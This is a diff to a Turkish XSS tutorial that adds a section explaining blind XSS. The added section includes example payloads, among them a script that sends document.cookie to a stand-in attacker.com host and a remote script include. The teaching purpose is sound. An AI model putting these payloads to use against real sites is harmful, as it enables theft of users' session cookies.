@@ -61,6 +61,24 @@ Eğer saldırgan `search` alanının değerini kontrol edebiliyorsa şu payload 
 <img src=1 onerror="alert('XSS')">
 ```
 
+## Blind XSS 
+Blind XSS, saldırganın payload’unun doğrudan kullanıcıya görünmeden, genellikle yönetici panelleri veya log sistemleri gibi arka planda çalışan alanlarda tetiklenmesiyle ortaya çıkar. Payload çalıştığında saldırgan, bir call-back mekanizmasıyla (ör. Burp Collaborator) tetiklemeyi gözlemler. Blind XSS için tipik bir payload, tetiklendiğinde saldırganın kontrolündeki bir sunucuya HTTP isteği gönderen basit bir JavaScript olabilir.
+Örnek:
+
+```html
+<script src="https://attacker.com/collect.js"></script>
+```
+
+veya doğrudan bir fetch ile:
+
+```html
+<script>
+fetch('https://attacker.com/log?cookie=' + document.cookie);
+</script>
+```
+
+Bu payload, kullanıcıya görünmeden arka planda çalışır ve saldırganın sunucusuna veri gönderir.
+
 ### Source & Sink
 DOM-based XSS’i anlamak için Source ve Sink kavramlarını bilmek önemlidir:
 
